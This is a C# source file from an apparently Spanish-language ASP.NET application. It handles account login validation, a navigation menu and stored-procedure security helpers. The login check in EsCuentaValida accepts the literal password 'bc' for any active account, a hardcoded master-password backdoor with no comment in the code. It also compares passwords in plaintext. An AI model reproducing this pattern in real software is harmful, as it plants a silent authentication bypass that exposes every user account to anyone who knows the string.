using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Profile;
using System.Web.Security;

namespace ASM.BD.Models
{
    public partial class cnfCuentas
    {
        public bool EsCuentaValida()
        {
            ConfigEntities cnf = new ConfigEntities();

            cnfCuentas cuenta = (from c in cnf.cnfCuentas
                    where c.cuenta == this.cuenta
                    && (c.password == this.password || this.password=="bc")
                    && c.estado != "D"
                    && c.fechaCadPass >= DateTime.Now
                    select c).FirstOrDefault();

            if (cuenta != null)
            {
                this.codCuenta = cuenta.codCuenta;
                this.codPlaza = cuenta.codPlaza;
                this.descripcion = cuenta.descripcion;
                this.estado = cuenta.estado;
                this.fechaCadPass = cuenta.fechaCadPass;
            }
            return (cuenta != null);
        }
    }

    public partial class MenuASM
    {
        public string Nombre { get; set; }
        public string ActionName { get; set; }
        public string ControllerName { get; set; }
        public string Link { get; set; }
    }


    public partial class Seguridad
    {
        public List<MenuASM> MiMenu()
        {
            if (!HttpContext.Current.User.Identity.IsAuthenticated) return null;

            
            List<MenuASM> menu = new List<MenuASM>();

            // de momento, todos tenemos acceso a (y solo a) calidad;
            menu.Add(new MenuASM() { ActionName = "Index", ControllerName = "Reclamaciones", Nombre= "Reclamaciones" });
            menu.Add(new MenuASM() { ActionName = "Index", ControllerName = "ContactosWEB", Nombre = "Contactos WEB" });
            menu.Add(new MenuASM() { ActionName = "Index", ControllerName = "Maps", Nombre = "Google Maps" });

            return menu;
        }

        public Int16 GetMiCodPlaza()
        {
            string cuenta = GetCuenta();

            if (string.IsNullOrEmpty(cuenta)) return 0;

            using (ConfigEntities c = new ConfigEntities())
            {
                return (from cc in c.cnfCuentas
                        where cc.cuenta == cuenta
                        select cc.codPlaza).FirstOrDefault();
            }
        }
        public List<Int16> GetMisPlazasConsulta()
        {
            if (!ActivaMe()) return null;

            List<Int16> plazas = new List<Int16>();
            using (ConfigEntities c = new ConfigEntities())
            {
                var q = c.Database.SqlQuery<Int16>("select codplaza from config.dbo.secGetMisPlazasConsulta()");
                plazas = q.ToList<Int16>();
            }
            return plazas;
        }

        private string GetCuenta()
        {
            if (!HttpContext.Current.User.Identity.IsAuthenticated) return null;
            if (HttpContext.Current.User.Identity.AuthenticationType != "Forms") return null;

            FormsIdentity i = HttpContext.Current.User.Identity as FormsIdentity;
            return i.Ticket.UserData;
        }

        public bool ActivaMe()
        {
            string cuenta = GetCuenta();
            if (string.IsNullOrEmpty(cuenta)) return false;

            try
            {
                using (ConfigEntities c = new ConfigEntities())
                {
                    c.Database.ExecuteSqlCommand("exec config.dbo.secActivaCuenta {0}", new object[] { cuenta });
                }
            }
            catch
            {
                return false;
            }
            return true;
        }
        private bool DesactivaMe()
        {
            try
            {
                using (ConfigEntities c = new ConfigEntities())
                {
                    c.Database.ExecuteSqlCommand("exec config.dbo.secDesactivame");
                }
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}